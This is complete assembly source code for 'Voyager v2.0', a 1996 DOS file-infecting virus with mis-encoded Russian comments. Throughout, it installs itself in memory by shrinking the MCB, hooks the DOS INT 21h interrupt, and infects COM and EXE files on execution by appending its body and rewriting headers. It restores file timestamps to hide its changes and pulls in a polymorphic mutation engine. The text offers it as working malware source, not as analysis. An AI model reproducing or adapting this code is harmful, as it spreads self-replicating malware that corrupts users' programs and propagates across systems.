   ;¢¨àãá  VOYAGER (û)
   ;*®«ãç¥¨¥ tasm virusik.asm /m
   ;      tlink virusik.obj /t/x

   .MODEL TINY
   .CODE
   .STARTUP
   JUMPS

   Vir_Len     equ End_of_Vir-VStart+16 ;‡¤¥áì ¤«¨  ¢¨àãá 

   VStart:
       cld
       push    ds es

       call    $+3
       pop bp          ;„¥« ¥¬  ¤à¥á æ¨î ç¥à¥§ bp
       sub bp,offset $-1       ;â.¥. ¤«¨  ä ©« +á¬¥é¥¨¥ ¯® ¢¨àãáã
                       ;*â® ã¦® ¤«ï â®£® çâ®¡ë ¢¨àãá ¬®£ ¢
                       ;ä ©«¥ à ¡®â âì

   ;*à®¢¥àª  ¯ ¬ïâ¨   ¢¨àãá
       mov ax,0EBA1h
       int 21h
       cmp ax,00DAh
       jz  Installed   ;“¦¥ ¢ ¯ ¬ïâ¨


   ;Žáâ ¢«ï¥¬ ¢¨àãá à¥§¨¤¥âë¬

   Stay_At_Memory:

           mov     ax,ds                   ; Š®àà¥ªâ¨àã¥¬ MCB
           push    ax
       dec     ax          ; ’¥¯¥àì ¢ ax -> MCB
           mov     ds,ax
           mov     cl,4            ;
           mov     dx,Vir_len      ;
       add dx,dx
       add dx,1440
           shr     dx,cl           ;*¥à¥¢®¤¨¬ ¢ ¯ à £à äë

           sub     word ptr ds:[03h],dx    ; * §¬¥à MCB
       sub     word ptr ds:[12h],dx    ; * §¬¥à ¯®¤ ¯à®£ã ¢ PSP
           pop     ax
           add     ax,word ptr ds:[03h]

           inc     ax                      ; es:di= ¤à¥á ª®¤  à¥§¨¤¥â 
           mov     es,ax
       sub di,di
           lea     si,[bp+VStart]
           mov     cx,Vir_Len
           repnz   movs byte ptr es:[di],cs:[si] ; Š®¯¨àã¥¬ ¢ ¯ ¬ïâì ds:si -> es:di

           push    bx es
       pop ds

   ;‘®åà ï¥¬ áâ àë© 21h ¢¥ªâ®à

       mov ax,3521h        ; Int 21h
       int 21h

       mov word ptr ds:[Old_21-100h],bx
       mov word ptr ds:[Old_21-100h+2],es

       pop bx

   ;“áâ  ¢«¨¢ ¥¬ á¢®© 21 ¢¥ªâ®à

       mov ax,2521h            ; Int 21h
       lea dx,[New_21-100h]
       int 21h


   ;‚®ááâ  ¢«¨¢ ¥¬ áâ àë© § £®«®¢®ª ä ©« 

   Installed:
       pop es ds
       cmp word ptr cs:[bp+Old_Header],'ZM'
       je  EXE_Exit

       lea si,[bp+Old_Header]
       mov di,100h
       mov cx,4
       repnz   movsb
       mov ax,100h
       push    ax
       retn
   EXE_Exit:
       mov ax,ds
       add ax,10h
       add word ptr cs:[bp+Old_CS+2],ax
       add word ptr cs:[bp+Old_SS+2],ax
       cli
       mov ss,word ptr cs:[bp+Old_SS+2]
       mov sp,word ptr cs:[bp+Old_SS]
       sti

       jmp dword ptr cs:[bp+Old_CS]




   ;*******************************************************************************
   ;           *…‡ˆ„…*’*€Ÿ —€‘’œ ‚ˆ*“‘€
   New_21:
       cmp ax,0EBA1h   ;*à®¢¥àª    à¥§¨¤¥â®áâì
       jne Continue
       mov ax,00DAh
       iret

   Continue:
       push    bp ax bx cx dx si di ds es
       call    $+3
       pop bp      ;’ ª¦¥ ¤¥« ¥¬  ¤à¥á æ¨î ç¥à¥§ bp ¢ ®¯¥à â¨¢ª¥
       sub bp,Offset $-1

       cmp ax,4b00h    ;”ãªæ¨ï Exec
       jz  Infect
       jmp Continue1

   Jmp21h:
       xor ax,ax
       mov ds,ax
       mov ax,word ptr [bp+Old24_Ofs]
       mov word ptr ds:[24h*4],ax
       mov ax,word ptr [bp+Old24_Seg]
       mov word ptr ds:[24h*4+2],ax

   Continue1:
       pop es ds di si dx cx bx ax bp
       db  0eah
   Old_21  dd  ?

   Infect:
       push    ds
       xor ax,ax
       mov ds,ax
       mov ax,word ptr ds:[24h*4]
       mov word ptr cs:[bp+Old24_Ofs],ax
       mov ax,word ptr ds:[24h*4+2]
       mov word ptr cs:[bp+Old24_Seg],ax
       mov word ptr ds:[24h*4],Offset Handler24
       mov word ptr ds:[24h*4+2],cs
       pop ds


       mov ax,3d02h
       int 21h
       jc  Errors

       mov bx,ax
       push    cs cs
       pop ds es
       mov ax,5700h
       int 21h
       mov word ptr cs:[bp+Old_File_Time],cx
       mov word ptr cs:[bp+Old_File_Date],dx

       mov ah,3fh          ;‘ç¨âë¢ ¥¬ § £®«®¢®ª ä ©« 
       mov cx,18h
       lea dx,[bp+Old_Header]
       int 21h
       jc  Errors

       mov si,dx
       cmp word ptr [si],'ZM'
       jz  EXE

       cmp byte ptr [si+3],15h ;Already infected
       je  Errors

       mov al,2            ;Goto EOF
       call    Lseek

                       ;Check file size
       cmp ax,1024
       jbe Errors          ;Close if file is short
       cmp ax,60000
       jae Errors          ;Close if file is big

       sub ax,3
       mov word ptr cs:[bp+New_Header+1],ax ;Create new header

       lea si,[bp+VStart]
       lea di,[bp+End_of_Vir+16]
       mov cx,Vir_Len

       call    $UPD

       mov dx,di
       call    Write_Data      ;Write virus body to EOF

       mov al,0
       call    Lseek

       mov cx,4
       lea dx,[bp+New_Header]
       call    Write_Data      ;Write new header to file
       jmp CU          ;‡ ªàë¢ ¥¬ ä ©«


   Lseek:
       mov ah,42h          ;*à®æ¥¤ãà  ¯®§¨æ¨®¨à®¢ ¨ï
       xor cx,cx           ;ãª § â¥«ï
       xor     dx,dx
       int 21h
       ret

   Write_Data:
       mov ah,40h
       int 21h
       ret

   CU:
       mov ax,5701h
       mov cx,word ptr cs:[bp+Old_File_Time]
       mov dx,word ptr cs:[bp+Old_File_Date]
       int 21h

   Errors:
       mov ah,3eh
       int 21h
       jmp Jmp21h

   EXE:
       cmp word ptr cs:[si+12h],'gS'       ;Already infected
       je  Errors

       mov al,2
       call    Lseek
       mov word ptr cs:[bp+F_Len],dx

       push    ax dx ax dx
       cmp ax,1024
       jbe Errors
       cmp dx,8
       ja  Errors

       mov word ptr [si+12h],'gS'      ;VirusID
       mov ax,word ptr [si+14h]
       mov word ptr cs:[bp+Old_CS],ax  ;Save old cs:ip
       mov ax,word ptr [si+16h]
       mov word ptr cs:[bp+Old_CS+2],ax
       mov ax,word ptr [si+10h]        ;Save old ss:sp
       mov word ptr cs:[bp+Old_SS],ax
       mov ax,word ptr [si+0eh]
       mov word ptr cs:[bp+Old_SS+2],ax

       pop dx ax

       mov cx,10h      ;Make new code entry
       div cx

       sub ax,word ptr [si+8h] ;Here new cs:ip
       sbb dx,0
       mov word ptr [si+14h],dx

       mov word ptr [si+16h],ax
                       ;Here new ss:sp
       mov word ptr [si+0eh],ax
       mov word ptr [si+10h],(Vir_Len*2)+2000h

       push    si

       lea si,[bp+VStart]
       lea di,[bp+End_of_Vir+16]
       mov cx,Vir_Len
       call    $UPD
       mov word ptr cs:[bp+ADD_Addr],cx
       mov dx,di
       call    Write_Data

       pop si dx ax
       sub dx,dx
       add ax,1234h
   ADD_Addr    =   $-2
       adc dx,word ptr cs:[bp+F_Len]

       mov cx,200h
       div cx

       mov word ptr [si+2],dx
       inc ax
       mov word ptr [si+4],ax

       mov al,0
       call    Lseek

       lea dx,[bp+Old_Header]
       mov cx,18h
       call    Write_Data
       jmp CU

   VirusID     db 'Voyager v2.0 (c) 1996 by Shy Guy. ÅHANX Å0 NiGHÅ $iRiÅ! '
           db '/ ‹®§ï, Š á¯¥p ¨ * ãª -> ¤í¡¨«ë, lummerë / '
           db '“¢ ¦ ¥¬ë¥  â¨¢¨pãá®¯¨á â¥«¨, ¨¤¨â¥ ¢ ¯®¯ã!'

   Handler24:
       mov al,3
       iret

   include $UPD15.INC
   Old_File_Time   dw  ?
   Old_File_Date   dw  ?
   F_Len       dw  ?
   Old_CS      dd  ?
   Old_SS      dd  ?
   Old24_Ofs   dw  ?
   Old24_Seg   dw  ?
   New_Header  db  0E9h,0,0,15h
   Old_header  db  0cdh,20h,?,?,14h dup('F')
   End_of_Vir:

       END
